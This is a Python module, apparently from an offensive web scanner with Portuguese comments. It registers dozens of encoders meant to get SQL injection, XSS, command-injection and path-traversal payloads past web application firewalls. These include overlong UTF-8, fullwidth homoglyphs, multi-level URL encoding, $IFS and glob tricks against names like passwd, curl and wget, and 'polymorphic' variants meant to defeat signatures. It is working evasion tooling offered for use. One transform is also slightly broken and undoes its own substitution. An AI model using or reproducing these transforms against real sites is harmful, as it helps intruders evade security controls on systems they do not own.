"""
encoders/transforms.py
======================

Biblioteca de transformações de bypass / encoding.

Cada transform recebe uma string (o payload cru) e devolve UMA OU MAIS
variantes. Registrar via @register("nome"). A engine expande cada payload em
todas as variantes dos transforms selecionados pelo módulo de vulnerabilidade,
garantindo o máximo de diversidade de codificação e evasão de filtros.

O objetivo aqui não é "codificar corretamente" e sim gerar o maior número de
representações plausíveis que WAFs, filtros e parsers frágeis tratam de forma
divergente do backend real.
"""
from __future__ import annotations

import base64
import random
import re
import urllib.parse
from typing import Callable, Iterable, List

# Registry: nome -> função(str) -> list[str]
REGISTRY: dict[str, Callable[[str], List[str]]] = {}


def register(name: str):
    def deco(fn: Callable[[str], List[str]]):
        REGISTRY[name] = fn
        return fn
    return deco


def _as_list(x) -> List[str]:
    if isinstance(x, str):
        return [x]
    return list(x)


# ---------------------------------------------------------------------------
# Identidade / baseline
# ---------------------------------------------------------------------------
@register("raw")
def t_raw(s: str) -> List[str]:
    return [s]


# ---------------------------------------------------------------------------
# URL encoding
# ---------------------------------------------------------------------------
@register("url")
def t_url(s: str) -> List[str]:
    # quote apenas o que não é seguro
    return [urllib.parse.quote(s, safe="")]


@register("url_all")
def t_url_all(s: str) -> List[str]:
    # percent-encode de TODO byte (inclui alfanuméricos) -> evasão agressiva
    return ["".join("%%%02X" % b for b in s.encode("utf-8", "surrogatepass"))]


@register("url_double")
def t_url_double(s: str) -> List[str]:
    once = urllib.parse.quote(s, safe="")
    return [urllib.parse.quote(once, safe="")]


@register("url_triple")
def t_url_triple(s: str) -> List[str]:
    v = s
    for _ in range(3):
        v = urllib.parse.quote(v, safe="")
    return [v]


@register("url_plus")
def t_url_plus(s: str) -> List[str]:
    # espaços viram '+', úteis em application/x-www-form-urlencoded
    return [urllib.parse.quote_plus(s)]


# ---------------------------------------------------------------------------
# Unicode / UTF-8 tricks (IIS %uXXXX, overlong, fullwidth, decomposição)
# ---------------------------------------------------------------------------
@register("unicode_iis")
def t_unicode_iis(s: str) -> List[str]:
    # formato %uXXXX aceito historicamente por IIS/ASP e alguns proxies
    return ["".join("%%u%04X" % ord(c) for c in s)]


# mapa overlong UTF-8 para caracteres chave de path traversal / injeção
_OVERLONG = {
    "/": "%C0%AF",
    "\\": "%C1%9C",
    ".": "%C0%AE",
    "<": "%C0%BC",
    ">": "%C0%BE",
    "'": "%C0%A7",
    '"': "%C0%A2",
    " ": "%C0%A0",
}


@register("utf8_overlong")
def t_utf8_overlong(s: str) -> List[str]:
    out = []
    for c in s:
        if c in _OVERLONG:
            out.append(_OVERLONG[c])
        else:
            out.append(urllib.parse.quote(c, safe=""))
    return ["".join(out)]


# fullwidth / homoglyph — sobrevive a normalização Unicode preguiçosa
_FULLWIDTH = {chr(c): chr(c + 0xFEE0) for c in range(0x21, 0x7F)}


@register("fullwidth")
def t_fullwidth(s: str) -> List[str]:
    return ["".join(_FULLWIDTH.get(c, c) for c in s)]


# ---------------------------------------------------------------------------
# HTML entities (útil p/ XSS, SSTI, reflexões filtradas)
# ---------------------------------------------------------------------------
@register("html_dec")
def t_html_dec(s: str) -> List[str]:
    return ["".join("&#%d;" % ord(c) for c in s)]


@register("html_hex")
def t_html_hex(s: str) -> List[str]:
    return ["".join("&#x%X;" % ord(c) for c in s)]


@register("html_dec_pad")
def t_html_dec_pad(s: str) -> List[str]:
    # padding com zeros — bypass de filtros que casam &#NN; exato
    return ["".join("&#%07d;" % ord(c) for c in s)]


# ---------------------------------------------------------------------------
# Base64 / hex / escapes
# ---------------------------------------------------------------------------
@register("base64")
def t_base64(s: str) -> List[str]:
    return [base64.b64encode(s.encode()).decode()]


@register("hex_escape")
def t_hex_escape(s: str) -> List[str]:
    return ["".join("\\x%02x" % b for b in s.encode())]


@register("unicode_escape")
def t_unicode_escape(s: str) -> List[str]:
    return ["".join("\\u%04x" % ord(c) for c in s)]


# ---------------------------------------------------------------------------
# Case manipulation
# ---------------------------------------------------------------------------
@register("case_upper")
def t_case_upper(s: str) -> List[str]:
    return [s.upper()]


@register("case_lower")
def t_case_lower(s: str) -> List[str]:
    return [s.lower()]


@register("case_swap")
def t_case_swap(s: str) -> List[str]:
    return [s.swapcase()]


@register("case_random")
def t_case_random(s: str) -> List[str]:
    out = []
    for c in s:
        out.append(c.upper() if random.random() > 0.5 else c.lower())
    return ["".join(out)]


# ---------------------------------------------------------------------------
# Null byte / terminadores
# ---------------------------------------------------------------------------
@register("null_suffix")
def t_null_suffix(s: str) -> List[str]:
    return [s + "%00", s + "\x00", s + "%2500"]


@register("null_ext_suffix")
def t_null_ext_suffix(s: str) -> List[str]:
    # bypass de append de extensão (ex.: include("$p.php")) via null / query / newline
    return [s + "%00", s + "%00.png", s + "?", s + "#", s + "%23", s + "%0a"]


# ---------------------------------------------------------------------------
# Path / slash tricks (LFI / traversal / SSRF path)
# ---------------------------------------------------------------------------
@register("backslash")
def t_backslash(s: str) -> List[str]:
    return [s.replace("/", "\\")]


@register("double_slash")
def t_double_slash(s: str) -> List[str]:
    return [s.replace("/", "//")]


@register("mixed_slash")
def t_mixed_slash(s: str) -> List[str]:
    return [s.replace("/", "/\\"), s.replace("/", "\\/")]


# ---------------------------------------------------------------------------
# Whitespace bypass (command injection)
# ---------------------------------------------------------------------------
@register("ifs")
def t_ifs(s: str) -> List[str]:
    if " " not in s:
        return []
    return [
        s.replace(" ", "${IFS}"),
        s.replace(" ", "$IFS$9"),
        s.replace(" ", "%09"),          # tab
        s.replace(" ", "%0b"),          # vertical tab
        s.replace(" ", "{,}").replace("{,}", ","),  # brace expansion fallback
    ]


@register("newline_prefix")
def t_newline_prefix(s: str) -> List[str]:
    # prefixos de quebra de linha para injeção CRLF / comando encadeado
    return ["%0a" + s, "%0d%0a" + s, "\n" + s, "%250a" + s]


# ---------------------------------------------------------------------------
# SQL comment / concat tricks
# ---------------------------------------------------------------------------
@register("sql_comment_ws")
def t_sql_comment_ws(s: str) -> List[str]:
    if " " not in s:
        return []
    return [
        s.replace(" ", "/**/"),
        s.replace(" ", "%09"),
        s.replace(" ", "%0a"),
        s.replace(" ", "%a0"),          # non-breaking space (MySQL)
    ]


@register("sql_inline_case")
def t_sql_inline_case(s: str) -> List[str]:
    # bypass de blacklist tipo 'union'/'select' com inline comment MySQL
    repl = s
    for kw in ("union", "select", "from", "where", "or", "and"):
        repl = repl.replace(kw, "/*!" + kw + "*/").replace(kw.upper(), "/*!" + kw.upper() + "*/")
    return [repl] if repl != s else []


# ===========================================================================
# ARSENAL AGRESSIVO — encoders adicionais para máxima evasão
# ===========================================================================

# --- percent-encoding: variações de caixa do hex (%2F vs %2f) ---
@register("url_all_lower")
def t_url_all_lower(s: str) -> List[str]:
    return ["".join("%%%02x" % b for b in s.encode("utf-8", "surrogatepass"))]


@register("url_hex_mixed")
def t_url_hex_mixed(s: str) -> List[str]:
    out = []
    for b in s.encode("utf-8", "surrogatepass"):
        h = "%02X" % b
        h = "".join(c.lower() if random.random() > 0.5 else c for c in h)
        out.append("%" + h)
    return ["".join(out)]


@register("double_url_all")
def t_double_url_all(s: str) -> List[str]:
    once = "".join("%%%02X" % b for b in s.encode("utf-8", "surrogatepass"))
    return [once.replace("%", "%25")]


@register("triple_url_all")
def t_triple_url_all(s: str) -> List[str]:
    once = "".join("%%%02X" % b for b in s.encode("utf-8", "surrogatepass"))
    return [once.replace("%", "%2525")]


# --- UTF-8 overlong de 3 bytes (mais uma camada de ambiguidade) ---
_OVERLONG3 = {
    "/": "%E0%80%AF", "\\": "%E0%81%9C", ".": "%E0%80%AE",
    "<": "%E0%80%BC", ">": "%E0%80%BE", "'": "%E0%80%A7",
    '"': "%E0%80%A2", " ": "%E0%80%A0",
}


@register("utf8_overlong3")
def t_utf8_overlong3(s: str) -> List[str]:
    out = []
    for c in s:
        out.append(_OVERLONG3.get(c, urllib.parse.quote(c, safe="")))
    return ["".join(out)]


# --- best-fit / homoglyph: só os chars ESTRUTURAIS viram fullwidth, o resto
#     do payload continua ASCII (backend normaliza de volta; WAF não casa) ---
_BESTFIT = {
    "<": "＜", ">": "＞", "/": "／", "\\": "＼",
    ".": "．", "'": "＇", '"': "＂", "=": "＝",
    ";": "；", "|": "｜", "&": "＆", "(": "（",
    ")": "）", "*": "＊", ":": "：", "#": "＃",
    "%": "％", "$": "＄", "{": "｛", "}": "｝",
    "@": "＠", "!": "！", "?": "？", " ": "　",
}


@register("best_fit")
def t_best_fit(s: str) -> List[str]:
    return ["".join(_BESTFIT.get(c, c) for c in s)]


# --- alternativas de espaço (várias variantes numa tacada) ---
@register("space_variants")
def t_space_variants(s: str) -> List[str]:
    if " " not in s:
        return []
    subs = ["%20", "+", "%09", "%0b", "%0c", "%a0", "\t", "　", "%u0020"]
    return [s.replace(" ", x) for x in subs]


# --- alternativas de barra (path traversal / URL) ---
@register("slash_variants")
def t_slash_variants(s: str) -> List[str]:
    if "/" not in s:
        return []
    subs = ["%2f", "%2F", "%5c", "\\", "%252f", "%c0%af", "／", "//", "/."]
    return [s.replace("/", x) for x in subs]


# --- alternativas de ponto ---
@register("dot_variants")
def t_dot_variants(s: str) -> List[str]:
    if "." not in s:
        return []
    subs = ["%2e", "%2E", "%252e", "%c0%ae", "．"]
    return [s.replace(".", x) for x in subs]


# --- command injection: quebra keyword com quote/backslash vazio (i''d, c\url) ---
_CMD_WORD = re.compile(r"[a-zA-Z]{2,}")


@register("cmd_quote")
def t_cmd_quote(s: str) -> List[str]:
    def q(m):
        w = m.group(0)
        return w[0] + "\"\"" + w[1:]
    def bs(m):
        w = m.group(0)
        return w[0] + "\\" + w[1:]
    v1 = _CMD_WORD.sub(q, s)
    v2 = _CMD_WORD.sub(bs, s)
    out = []
    for v in (v1, v2):
        if v != s:
            out.append(v)
    return out


# --- command injection: globbing de caminho (/bin/cat -> /???/c?t) ---
@register("cmd_glob")
def t_cmd_glob(s: str) -> List[str]:
    v = s
    for a, b in (("/bin/", "/???/"), ("/etc/", "/???/"), ("passwd", "p?sswd"),
                 ("sleep", "sl?ep"), ("whoami", "who?mi"), ("cat", "c?t"),
                 ("curl", "c?rl"), ("wget", "w?et")):
        v = v.replace(a, b)
    return [v] if v != s else []


# --- SQL: comentário /**/ entre TODOS os caracteres de palavras-chave ---
@register("sql_comment_between")
def t_sql_comment_between(s: str) -> List[str]:
    for kw in ("union", "select", "sleep", "and", "or", "where", "from"):
        if kw in s.lower():
            def ins(m):
                w = m.group(0)
                return "/**/".join(w)
            return [re.sub(re.escape(kw), lambda m: "/**/".join(m.group(0)), s, flags=re.IGNORECASE)]
    return []


# --- XSS: String.fromCharCode / \u escapes só do miolo alfanumérico ---
@register("js_fromcharcode")
def t_js_fromcharcode(s: str) -> List[str]:
    codes = ",".join(str(ord(c)) for c in s)
    return [f"String.fromCharCode({codes})"]


# --- null byte em muitas codificações, sufixo ---
@register("null_multi")
def t_null_multi(s: str) -> List[str]:
    return [s + x for x in ("%00", "%2500", "\x00", "%0000", "%u0000", "%c0%80")]


# --- tab / newline entre payload (quebra assinaturas contíguas) ---
@register("tab_prefix")
def t_tab_prefix(s: str) -> List[str]:
    return ["%09" + s, "\t" + s, "%0c" + s]


# ===========================================================================
# POLIMÓRFICOS — cada chamada gera variantes DIFERENTES (defeat de assinatura)
# ===========================================================================
_POLY_N = 5  # quantas mutações distintas gerar por transform polimórfico


@register("poly_percent")
def t_poly_percent(s: str) -> List[str]:
    """Percent-encode de um subconjunto ALEATÓRIO dos bytes, caixa de hex sorteada."""
    out = set()
    data = s.encode("utf-8", "surrogatepass")
    for _ in range(_POLY_N * 2):
        buf = []
        for b in data:
            if random.random() < 0.45:
                h = "%02X" % b
                h = "".join(c.lower() if random.random() > 0.5 else c for c in h)
                buf.append("%" + h)
            else:
                buf.append(chr(b))
        out.add("".join(buf))
        if len(out) >= _POLY_N:
            break
    return list(out)


@register("poly_case")
def t_poly_case(s: str) -> List[str]:
    out = set()
    for _ in range(_POLY_N * 2):
        out.add("".join(c.upper() if random.random() > 0.5 else c.lower() for c in s))
        if len(out) >= _POLY_N:
            break
    return [x for x in out if x != s] or list(out)


@register("poly_ws")
def t_poly_ws(s: str) -> List[str]:
    """Substitui cada espaço por um separador sorteado (diferente a cada espaço)."""
    if " " not in s:
        return []
    subs = ["%09", "%0a", "%0c", "%0d", "+", "/**/", "%20", "%a0"]
    out = set()
    for _ in range(_POLY_N * 2):
        buf = []
        for ch in s:
            buf.append(random.choice(subs) if ch == " " else ch)
        out.add("".join(buf))
        if len(out) >= _POLY_N:
            break
    return list(out)


@register("poly_sql_noise")
def t_poly_sql_noise(s: str) -> List[str]:
    """Injeta comentários inline aleatórios em keywords SQL + ruído neutro."""
    kws = ("union", "select", "from", "where", "and", "or", "sleep", "order", "by")
    if not any(k in s.lower() for k in kws):
        return []
    out = set()
    for _ in range(_POLY_N * 2):
        v = s
        tag = "/*" + "".join(random.choice("abcdef0123456789") for _ in range(random.randint(1, 4))) + "*/"
        for k in kws:
            if k in v.lower() and random.random() > 0.4:
                v = re.sub(re.escape(k), lambda m: m.group(0) + tag, v, count=1, flags=re.IGNORECASE)
        v = v.replace(" ", random.choice([" ", "/**/", "%09", "%0a"]))
        out.add(v)
        if len(out) >= _POLY_N:
            break
    return [x for x in out if x != s]


@register("poly_mix")
def t_poly_mix(s: str) -> List[str]:
    """Combina caixa aleatória + percent-encode parcial aleatório (mistura forte)."""
    out = set()
    for _ in range(_POLY_N * 2):
        buf = []
        for ch in s:
            r = random.random()
            if r < 0.30:
                buf.append("%%%02X" % ord(ch) if ord(ch) < 128 else urllib.parse.quote(ch))
            elif r < 0.50 and ch.isalpha():
                buf.append(ch.upper() if random.random() > 0.5 else ch.lower())
            else:
                buf.append(ch)
        out.add("".join(buf))
        if len(out) >= _POLY_N:
            break
    return list(out)


# ---------------------------------------------------------------------------
# Grupos nomeados (para --encoders <grupo>)
# ---------------------------------------------------------------------------
GROUPS = {
    "url": ["url", "url_all", "url_double", "url_triple", "url_plus",
            "url_all_lower", "url_hex_mixed", "double_url_all", "triple_url_all"],
    "unicode": ["unicode_iis", "utf8_overlong", "utf8_overlong3", "fullwidth",
                "best_fit", "unicode_escape"],
    "case": ["case_upper", "case_lower", "case_swap", "case_random"],
    "path": ["backslash", "double_slash", "mixed_slash", "slash_variants",
             "dot_variants", "null_ext_suffix", "null_multi"],
    "cmd": ["ifs", "space_variants", "newline_prefix", "tab_prefix",
            "cmd_quote", "cmd_glob"],
    "sql": ["sql_comment_ws", "sql_inline_case", "sql_comment_between"],
    "html": ["html_dec", "html_hex", "html_dec_pad", "js_fromcharcode", "best_fit"],
    "space": ["space_variants", "tab_prefix", "ifs"],
    "poly": ["poly_percent", "poly_case", "poly_ws", "poly_sql_noise", "poly_mix"],
}

# arsenal de EVASÃO — usado quando a engine detecta um WAF num parâmetro.
# combina double/triple encode, unicode/overlong, best-fit, polimórficos e
# quebras de keyword; a engine ainda aplica encadeamento por cima.
EVASION = [
    "url", "url_double", "url_all", "double_url_all", "triple_url_all",
    "url_hex_mixed", "utf8_overlong", "utf8_overlong3", "unicode_iis",
    "fullwidth", "best_fit", "case_random", "null_multi",
    "slash_variants", "dot_variants", "space_variants",
    "poly_percent", "poly_case", "poly_ws", "poly_sql_noise", "poly_mix",
    "cmd_quote", "cmd_glob", "sql_comment_between", "html_dec", "html_hex",
]


# ---------------------------------------------------------------------------
# METADATA dos tampers — o que cada transform faz e que filtro tende a furar.
# Usado por `--list-transforms -v` (transparência) e como base p/ seleção
# sensível a contexto. Chaves ausentes caem no default de meta().
# ---------------------------------------------------------------------------
META = {
    "raw":              ("identidade", "nenhum — payload cru p/ baseline/controle"),
    "url":              ("percent-encode dos metacaracteres", "filtros que casam bytes literais"),
    "url_all":          ("percent-encode de TODOS os bytes", "matching por keyword literal"),
    "url_double":       ("double URL-encode (%25xx)", "WAF que decodifica 1x e o app 2x (mismatch)"),
    "url_triple":       ("triple URL-encode", "cadeias de proxy que decodificam múltiplas vezes"),
    "url_plus":         ("espaço como '+'", "filtros que só tratam %20"),
    "url_all_lower":    ("percent-encode hex minúsculo", "assinaturas fixadas em hex maiúsculo"),
    "url_hex_mixed":    ("hex do percent em caixa mista (%3C/%3c)", "regex de encode case-sensitive"),
    "double_url_all":   ("double-encode de todos os bytes", "normalização parcial no WAF"),
    "triple_url_all":   ("triple-encode de todos os bytes", "normalização parcial em cadeia"),
    "unicode_iis":      ("%uXXXX estilo IIS", "parsers legados/.NET que aceitam %u"),
    "utf8_overlong":    ("UTF-8 overlong 2 bytes", "decoders que aceitam overlong (mismatch)"),
    "utf8_overlong3":   ("UTF-8 overlong 3 bytes", "decoders tolerantes a overlong 3B"),
    "fullwidth":        ("caracteres fullwidth (Ｕ+ＦＦxx)", "WAF byte-a-byte; app normaliza NFKC"),
    "best_fit":         ("best-fit mapping (￮->o etc.)", "normalização best-fit no backend Windows"),
    "unicode_escape":   ("\\uXXXX", "contexto JS/JSON que reinterpreta escapes"),
    "html_dec":         ("entidades HTML decimais (&#60;)", "reflexão em HTML re-decodificada"),
    "html_hex":         ("entidades HTML hex (&#x3c;)", "reflexão em HTML re-decodificada"),
    "html_dec_pad":     ("entidades decimais zero-padded", "regex de entidade sem padding"),
    "js_fromcharcode":  ("String.fromCharCode(...)", "contexto JS; sem <,>,\" literais"),
    "base64":           ("base64 do payload", "campos que decodificam base64 server-side"),
    "hex_escape":       ("\\xNN", "contexto que interpreta hex-escape"),
    "case_upper":       ("MAIÚSCULAS", "matching keyword case-sensitive"),
    "case_lower":       ("minúsculas", "matching keyword case-sensitive"),
    "case_swap":        ("inverte a caixa", "matching keyword case-sensitive"),
    "case_random":      ("caixa aleatória (sElEcT)", "assinaturas fixas de keyword"),
    "null_suffix":      ("sufixo NUL (%00)", "truncamento por null-byte em C/legado"),
    "null_ext_suffix":  ("NUL + extensão falsa", "checagem de extensão via null-byte"),
    "null_multi":       ("NUL em posições múltiplas", "sanitizadores frágeis a null-byte"),
    "backslash":        ("barra->contrabarra (\\)", "path filter que só olha '/'"),
    "double_slash":     ("barras duplicadas (//)", "normalização de path divergente"),
    "mixed_slash":      ("mistura / e \\", "parsers de path Win/Unix divergentes"),
    "slash_variants":   ("variações de separador de path", "traversal filter"),
    "dot_variants":     ("variações de '.' (%2e, ....//)", "traversal ../ filtrado literal"),
    "ifs":              ("espaço como $IFS", "cmdi com filtro de espaço"),
    "space_variants":   ("substitutos de espaço (tab/IFS/{})", "cmdi/sql com filtro de espaço"),
    "tab_prefix":       ("prefixo TAB", "filtro que espera espaço"),
    "newline_prefix":   ("prefixo newline (%0a)", "cmdi via quebra de linha"),
    "cmd_quote":        ("aspas quebrando token (i''d)", "cmdi com blocklist de keyword"),
    "cmd_glob":         ("glob no comando (/bin/c?t)", "cmdi com blocklist de nome de binário"),
    "sql_comment_ws":   ("comentário SQL no lugar de espaço (/**/)", "SQLi com filtro de espaço"),
    "sql_comment_between": ("comentário entre keywords (UN/**/ION)", "SQLi keyword matching"),
    "sql_inline_case":  ("keyword SQL em caixa inline", "SQLi keyword case-sensitive"),
    "poly_percent":     ("polimórfico: percent parcial", "assinatura frágil a forma mista"),
    "poly_case":        ("polimórfico: caixa mista", "assinatura frágil a caixa"),
    "poly_ws":          ("polimórfico: whitespace variado", "assinatura frágil a espaço"),
    "poly_sql_noise":   ("polimórfico: ruído SQL inócuo", "assinatura de padrão SQL fixo"),
    "poly_mix":         ("polimórfico: combina várias táticas", "assinaturas rígidas em geral"),
}

_META_DEFAULT = ("transformação de bypass", "filtros/parsers frágeis a esta forma")


def meta(name: str) -> tuple[str, str]:
    """(descrição, o-que-evade) do transform. Default p/ nomes sem entrada."""
    return META.get(name, _META_DEFAULT)


def resolve_names(names: Iterable[str]) -> List[str]:
    """Expande grupos e valida nomes. 'all' = registry inteiro."""
    out: List[str] = []
    for n in names:
        n = n.strip()
        if not n:
            continue
        if n == "all":
            out = list(REGISTRY.keys())
            break
        if n in GROUPS:
            out.extend(GROUPS[n])
        elif n in REGISTRY:
            out.append(n)
    # dedup preservando ordem
    seen = set()
    return [x for x in out if not (x in seen or seen.add(x))]


# ---------------------------------------------------------------------------
# Expansão principal (com encadeamento de encoders)
# ---------------------------------------------------------------------------
def expand(payload: str, transforms: Iterable[str],
           chain_depth: int = 1, limit: int = 0) -> List[tuple[str, str]]:
    """
    Devolve lista de (variante, rótulo). Inclui 'raw' primeiro.

    chain_depth > 1 ativa ENCADEAMENTO: aplica transforms sobre variantes já
    transformadas (ex.: overlong -> double_url), multiplicando a evasão. O
    rótulo vira 'a+b' para combinações. `limit` corta o total (0 = ilimitado).
    """
    transforms = list(transforms)
    seen = set()
    out: List[tuple[str, str]] = []

    def _add(val: str, name: str) -> bool:
        if val and val not in seen:
            seen.add(val)
            out.append((val, name))
            return True
        return False

    _add(payload, "raw")

    # nível 1
    frontier: List[tuple[str, str]] = []
    for name in transforms:
        fn = REGISTRY.get(name)
        if not fn:
            continue
        try:
            for variant in _as_list(fn(payload)):
                if _add(variant, name):
                    frontier.append((variant, name))
        except Exception:
            continue

    # níveis 2..chain_depth (encadeamento)
    for _ in range(2, chain_depth + 1):
        new_frontier: List[tuple[str, str]] = []
        for val, label in frontier:
            for name in transforms:
                fn = REGISTRY.get(name)
                if not fn:
                    continue
                try:
                    for variant in _as_list(fn(val)):
                        if _add(variant, f"{label}+{name}"):
                            new_frontier.append((variant, f"{label}+{name}"))
                except Exception:
                    continue
                if limit and len(out) >= limit:
                    return out[:limit]
        frontier = new_frontier

    return out[:limit] if limit else out


def available() -> List[str]:
    return sorted(REGISTRY.keys())


def groups() -> dict:
    return GROUPS
